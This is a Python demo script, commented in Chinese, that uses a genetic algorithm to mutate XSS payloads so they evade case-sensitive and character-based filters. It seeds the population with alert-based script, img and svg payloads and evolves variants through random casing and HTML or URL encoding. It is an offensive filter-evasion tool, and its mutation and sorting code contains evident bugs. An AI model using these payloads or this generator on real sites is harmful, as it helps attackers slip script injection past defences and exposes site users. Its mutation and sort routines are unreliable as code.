# 生成攻击向量的遗传算法简明demo
# 为方便理解，在本demo中，仅设定2个混淆变异基因型：标签闭合/打开，转码
# __in代表了在其他模块中获取的必要信息。

from urllib.parse import unquote as decode_urlcode
import random
import html
import re

class __in_gen_type(object):
    name = ''       #该基因的名称
    desp = ''       #对该基因的额外描述
    bits = 0       #该基因位宽

    @staticmethod
    def parse(vector,code):    #将该基因表现的特征赋予攻击向量的操作
        return vector

    @staticmethod
    def unparse(vector,code):    #将该基因恢复成未拥有该特征的情况，部分的基因类型是没有的
        return vector

    @staticmethod
    def detect(vector):     #判断攻击向量是否具有该基因，是输出对应基因代码
        return 0

    @staticmethod
    def value(code):        #对输入基因片段的"价值"进行评价(增加该基因后，攻击向量强度的变化，事实上，该值将通过文本分析训练出来)
        return 0


class __in_gen_capital(__in_gen_type):
    name = '大小写混淆'
    desp = '拥有该基因型的攻击向量，大小写字母是随机的，以绕过区分大小写的XSS过滤检测\
            位宽为2：01代表全大写的攻击向量，10代表大小写随机的攻击向量，00代表全小写的攻击向量'
    bits = 2

    @staticmethod
    def parse(vector,code):
        if (code == 0b00):
            return vector.lower()
        elif (code == 0b01):
            return vector.upper()
        elif (code == 0b10):
            return ''.join(random.choice((str.upper, str.lower))(c) for c in vector)
        elif (code == 0b11):
            return vector     #无效的不良基因，不做任何处理

    @staticmethod
    def detect(vector):
        if (vector.lower() == vector):
            return 0b00
        elif (vector.upper() == vector):
            return 0b01
        else:
            return 0b10

    @staticmethod
    def value(code):
        result = 0
        if (code == 0b00): result = -10
        if (code == 0b01): result = 20
        if (code == 0b10): result = 10
        if (code == 0b11): result = -100
        return result


class __in_gen_character_escape(__in_gen_type):
    name = '转义'
    desp = '利用转义字符绕过对xss向量的检测，例如将<替换为&lt;为\'增加转义字符等等\
           位宽为3：三位独立，1XX代表对<进行转义，X1X代表对>进行转义，XX1代表对斜杠增加双斜杠进行转义'
    bits = 3

    @staticmethod
    def parse(vector,code):
        result = vector
        if (code & 0b100 == 0b100):
            lt_codelist = [html.escape('<'), r'&#60;', r'&#x3c', r'%3c'] # 转义字符，HTML编码，URL编码，
            #lt_codelist = [html.escape('<'), r'&#60;', r'&#x3c', r'\x3c','\u003c']
            determined_style = random.randint(0, len(lt_codelist)-1)
            result = result.replace('<',lt_codelist[determined_style])
        if (code & 0b010 == 0b010):
            rt_codelist = [html.escape('>'), r'&#62', r'&#x3e', r'%3e']
            determined_style = random.randint(0, len(rt_codelist)-1)
            result = result.replace('>',rt_codelist[determined_style])
        if (code & 0b001 == 0b001):
            result = result.replace('\\','\\\\')
            result = result.replace('\'', '\\\'')
        return result

    @staticmethod
    def unparse(vector,code):
        result = vector
        if (code & 0b110 > 0 ):
            #result = result.replace('(\\\\)x[0-9a-fA-F]{2}','\\')\
            result = html.unescape(result)
            result = decode_urlcode(result)
        if (code & 0b001 > 0):
            result = result.replace('\\\\','\\')
            result = result.replace('\\\'','\'')
        return result

    @staticmethod
    def detect(vector):
        result = 0
        findlt_re = re.compile('&#0{0,}60|&#x?0{0,}3c|%0{0,}3c|&lt', re.IGNORECASE)
        findrt_re = re.compile('&#0{0,}62|&#x?0{0,}3e|%0{0,}3e|&rt', re.IGNORECASE)
        findescape_re = re.compile('\\\\|\\\'',re.IGNORECASE)
        #print('vector={0}'.format(vector))
        if (findlt_re.findall(vector) != []): result = result | 0b100
        if (findrt_re.findall(vector) != []): result = result | 0b010
        if (findescape_re.findall(vector) != []): result = result | 0b001
        return result

    @staticmethod
    def value(code):
        result = 0
        if (code & 0b100): result += 10
        if (code & 0b010): result += 10
        if (code & 0b001): result += 10
        return result

class genetic():
    def __init__(self,gen_type_list):
        self.gen_type_list = []
        self.gen_length = 0
        self.gen_location_list = []
        self.load_gentype_list(gen_type_list)
        self.init_gen_location_list()

    def load_gentype_list(self,gentypelist):
        self.gen_type_list = gentypelist

    def load_gen_attr(self,gen_type_name_str,gen_attr_name):
        return getattr(eval(gen_type_name_str),gen_attr_name)

    def init_gen_location_list(self):
        start_location = 0
        for gen_type in self.gen_type_list:
            self.gen_location_list.append(start_location)
            self.gen_length += self.load_gen_attr(gen_type,'bits')
            start_location += self.load_gen_attr(gen_type,'bits')

    def get_genetic_type_bits(self,genetic_type_name):
        return self.load_gen_attr(genetic_type_name,'bits')

    #获取一个字符串对应的基因
    def get_genetic(self,vector):
        result = 0
        for i in range(0,len(self.gen_type_list)):
            current_gen_fragments = self.load_gen_attr(self.gen_type_list[i],'detect')(vector)
            result = result | current_gen_fragments << self.gen_location_list[i]
        return result

    #获取一个基因对应的价值
    def get_fitness_by_gen(self,gen):
        result = 0
        for i in range(0,len(self.gen_type_list)):
            current_gen_fragments_value = self.load_gen_attr(self.gen_type_list[i],'value')(gen)
            result = result + current_gen_fragments_value
        return result

    def parse_vector_by_new_gen(self,vector,new_gen):
        result = vector
        for i in range(0,len(self.gen_type_list)):
            current_gen_fragments = self.load_gen_attr(self.gen_type_list[i],'detect')(result)
            new_gen_fragments = (new_gen >> self.gen_location_list[i]) % (2 ** self.load_gen_attr(self.gen_type_list[i], 'bits'))
            result = self.load_gen_attr(self.gen_type_list[i], 'unparse')(result,current_gen_fragments)
            result = self.load_gen_attr(self.gen_type_list[i], 'parse')(result,new_gen_fragments)
        return result

    def get_fitness_by_vector(self,vector): return self.get_fitness_by_gen(self.get_genetic(vector))

#遵循给定的基因建立种群，并经过
class population():
    def __init__(self,genetic_obj , start_vector_list, min_fitness = 10, crossover_probability = 5000, new_crossover_pencentage = 25, mutation_probabilty = 500, max_generation = 10):
        self.genetic = genetic_obj                                                      # 基因模板
        self.current_individual_list  = self.creat_individual_dist(start_vector_list)   # 当前种群中还拥有的攻击向量
        self.min_fitness = min_fitness                                                  # 最小适应度，估值小于该值的，将会被淘汰
        self.crossover_probability  = crossover_probability                             # 基因交叉概率，范围在(0,10000]，代表该代将有该值的概率进行交换
        self.new_crossover_pencentage =  new_crossover_pencentage                       # 至少交叉的次数占比，将进行相对于原种群多少次的尝试不重复交叉，最大不超过50（暂RT模式限定）
        self.mutation_probabilty = mutation_probabilty                                  # 基因变异概率，范围在[0,10000]，每一位将有万分之该值%o的概率，将该位基因取反
        self.max_generation = max_generation                                            # 最大的代数，也就是演进循环的次数

    def new_individual_item(self, vector = '',vector_genetic = None):
        result_item = {}
        if (vector != '' and vector_genetic == None):
            result_item['vector'] = vector
            result_item['genetic'] = self.genetic.get_genetic(vector)
        elif (vector != '' and vector_genetic != None):
            result_item['genetic'] = vector_genetic
            result_item['vector'] = self.genetic.parse_vector_by_new_gen(vector,vector_genetic)
        else:
            result_item['vector'] = ''
            result_item['genetic'] = 0
        return result_item

    def creat_individual_dist(self,vector_list):
        result = []
        for vector in vector_list:
            result.append(self.new_individual_item(vector))
        return result

    # 改变某一位的基因，返回改变后的item
    def change_gen(self,changed_gen,start_radix,lentgh,source_item):
        changed_gen_mask = ((2 ** lentgh) - 1) << start_radix
        changed_gen_mask = ~changed_gen_mask
        new_gen = (source_item['genetic'] & changed_gen_mask)|(changed_gen << start_radix)
        prepare_new_mutation_item = self.new_individual_item(source_item['vector'],
                                                             new_gen)
        return prepare_new_mutation_item

    #执行函数入口
    def run_population(self,if_debug = False):
        for i in range(0,self.max_generation):
            if (if_debug) :print ('=======generate{0}======'.format(i))
            self.evolution(if_debug)

    #进行一代进化
    def evolution(self,if_debug = False):
        self.crossover(debug_info=if_debug)
        self.mutation(debug_info=if_debug)
        self.select()

    # 基因交换
    # 类型为RT 轮盘赌选择，类型为PR，纯随机选取
    def crossover(self,Type = 'RT',debug_info = False):
        new_crossover_items = []
        if (Type == 'RT'):
            sum_fitness = self.calculate_crossover_chance_list()
            self.sort_by_fitness()
            chance_list = []
            for current_individual in self.current_individual_list:
                chance_list.append(current_individual['fitness'])
            if (debug_info): print('chance_list={0}'.format(chance_list))
            selected_pair = []
            while (len(selected_pair) <= (len(self.current_individual_list) * (self.new_crossover_pencentage * 0.01))):
                selected = []
                while (True):
                    selected.clear()
                    i = 0
                    select_probility = random.randint(0, sum_fitness)
                    probility_min = 0
                    if (debug_info): print('first_probility = {0}'.format(select_probility))
                    while (True):
                        if (probility_min <= select_probility and select_probility <= probility_min + chance_list[i]):
                            selected.append(i)
                            if (debug_info): print('first_selected = {0}'.format(i))
                            break
                        else:
                            probility_min += chance_list[i]
                            i = i + 1
                    i = 0
                    select_probility = random.randint(0, sum_fitness)
                    probility_min = 0
                    if (debug_info): print('second_probility = {0}'.format(select_probility))
                    while (True):
                        if (probility_min <= select_probility and select_probility <= probility_min + chance_list[i]):
                            if (not i in selected):
                                selected.append(i)
                                if (debug_info): print('second_selected = {0}'.format(i))
                                break
                            else:
                                if (debug_info): print('same,rebuild_second_probility = {0}'.format(select_probility))
                                select_probility = random.randint(0, sum_fitness)
                                probility_min = 0
                                i = 0 # 抽重了就重抽
                        else:
                            probility_min += chance_list[i]
                            i = i + 1
                    if debug_info :print('selected pair={0}'.format(selected))
                    if (not selected in selected_pair):
                        selected_pair.append(selected)
                        break
                crossover_this_item = self.current_individual_list[selected[0]]
                crossover_that_item = self.current_individual_list[selected[1]]
                for i in range(0, len(self.genetic.gen_type_list)):
                    probility_crossover = random.randint(0, 10000)
                    if (probility_crossover < self.crossover_probability):
                        this_gen = (crossover_this_item['genetic'] >> self.genetic.gen_location_list[i]) % (2 ** self.genetic.get_genetic_type_bits(self.genetic.gen_type_list[i]))
                        that_gen = (crossover_that_item['genetic'] >> self.genetic.gen_location_list[i]) % (2 ** self.genetic.get_genetic_type_bits(self.genetic.gen_type_list[i]))
                        if (this_gen != that_gen):
                            if (debug_info):
                                print('crossed_this_item:')
                                print([that_gen, self.genetic.gen_location_list[i],  self.genetic.get_genetic_type_bits(self.genetic.gen_type_list[i]), crossover_this_item])
                            crossed_this_item = self.change_gen(that_gen,
                                                                self.genetic.gen_location_list[i],
                                                                self.genetic.get_genetic_type_bits(self.genetic.gen_type_list[i]),
                                                                crossover_this_item)
                            if not crossed_this_item in new_crossover_items:
                                new_crossover_items.append(crossed_this_item)
                            crossed_that_item = self.change_gen(this_gen,
                                                                self.genetic.gen_location_list[i],
                                                                self.genetic.get_genetic_type_bits(self.genetic.gen_type_list[i]),
                                                                crossover_that_item)
                            if not crossed_that_item in new_crossover_items:
                                new_crossover_items.append(crossed_that_item)
                if (debug_info):
                    print('current_new_crossover_items:')
                    print(new_crossover_items)

        if (Type == 'PR'):
            dynamic_crossover_probability = self.crossover_probability
            for individual_items in self.current_individual_list:
                for i in range(0,self.genetic.gen_length):
                    probility_crossover = random.randint(0,10000)
                    if (probility_crossover >= dynamic_crossover_probability):
                        crossover_source_item_index = random.randint(0,len(self.current_individual_list))
                        crossover_source_item = self.current_individual_list[crossover_source_item_index]
                        this_gen = (individual_items['genetic'] >> i) % 2
                        crossover_source_gen = (crossover_source_item['genetic'] >> i) % 2
                        #  def change_gen(self,changed_gen,start_radix,lentgh,source_item):
                        if (this_gen != crossover_source_gen):
                            crossed_this_item = self.change_gen(crossover_source_gen,i,1,individual_items)
                            if not crossed_this_item in new_crossover_items:
                                new_crossover_items.append(crossed_this_item)
                            crossed_that_item = self.change_gen(this_gen,i,1,crossover_source_item)
                            if not crossed_that_item in new_crossover_items:
                                new_crossover_items.append(crossed_that_item)
                dynamic_crossover_probability = dynamic_crossover_probability * 0.9
        for new_item in new_crossover_items:
            if not new_item in self.current_individual_list:
                self.current_individual_list.append(new_item)

    # 基因突变
    def mutation(self,debug_info = False):
        new_mutation_items = []
        for individual_items in self.current_individual_list:
            for i in range(0,self.genetic.gen_length):
                probility_mutation = random.randint(0,10000)
                if (probility_mutation < self.mutation_probabilty):
                    new_gen = (~((individual_items['genetic'] << i) % 2)) % 2
                    if(debug_info):  print('current_individual_items = {0}'.format(individual_items))
                    if(debug_info):
                        print('prepare_new_mutation_item:')
                        print([new_gen,i,1,individual_items])
                    prepare_new_mutation_item = self.change_gen(new_gen,
                                                                i,
                                                                1,
                                                                individual_items)
                    if not prepare_new_mutation_item in new_mutation_items:
                        new_mutation_items.append(prepare_new_mutation_item)
        for new_item in new_mutation_items:
            if not new_item in self.current_individual_list:
                self.current_individual_list.append(new_item)

    # 淘汰
    def select(self):
        index = 0
        while(True):
            current_item_fitness = self.genetic.get_fitness_by_gen(self.current_individual_list[index]['genetic'])
            if (current_item_fitness < self.min_fitness):
                self.current_individual_list.remove(self.current_individual_list[index])
                index = index - 1
            if (index < len(self.current_individual_list) - 1):
                index = index + 1
                continue
            else:
                break

    def calculate_crossover_chance_list(self):
        sum_fitness = 0
        for current_individual in self.current_individual_list:
            this_fitness = self.genetic.get_fitness_by_gen(current_individual['genetic'])
            current_individual['fitness'] = this_fitness
            sum_fitness += this_fitness
        return sum_fitness

    def sort_by_fitness(self):
        return sorted(self.current_individual_list, key=lambda x: x['genetic'], reverse=True)

#__in_basevector = ['<SCRIPT SRC=alert(\'XSS\')></SCRIPT>','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<svg/onload=alert(\'xss\')>','&#x3cIMG LOWSRC="javascript:alert(\'XSS\')">']   #这是输入的基本向量库，导入或用户给定。
__in_basevector = ['<SCRIPT SRC=alert(\'XSS\')></SCRIPT>','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">']
__in_gentype_list = ['__in_gen_capital','__in_gen_character_escape']    #当前装载的所有识别基因列表，为演示简洁直接给出

if __name__ == '__main__':
    demo_genetic = genetic(__in_gentype_list)
    #def __init__(self,genetic_obj , start_vector_list, min_fitness = 10, crossover_probability = 5000, new_crossover_pencentage = 25, mutation_probabilty = 500, max_generation = 10):
    demo_population = population(genetic_obj = demo_genetic,
                                 start_vector_list=__in_basevector,
                                 min_fitness = 20,
                                 max_generation=4 )
    demo_population.run_population(if_debug = True)
    print('最终生成的种群:')
    for item in demo_population.current_individual_list:
        print(item)




